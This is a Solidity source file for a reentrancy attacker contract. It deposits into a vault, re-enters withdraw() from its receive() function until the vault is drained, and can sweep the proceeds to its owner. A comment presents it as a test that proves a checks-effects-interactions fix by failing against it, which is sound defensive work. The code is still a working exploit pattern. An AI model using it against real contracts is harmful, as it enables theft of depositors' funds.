// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

// Real attacker: deposits one chunk, then re-enters withdraw() from receive() until the vault is
// drained. Against a checks-effects-interactions vault the re-entrant withdraw reverts, which reverts
// the whole attack — so the SAME attacker proves the fix by failing on-chain.
contract ReentrancyAttacker {
    IVault public vault;
    address public owner;
    uint256 public chunk;

    constructor(address v) {
        vault = IVault(v);
        owner = msg.sender;
    }

    function attack() external payable {
        chunk = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= chunk) {
            vault.withdraw();
        }
    }

    function sweep() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
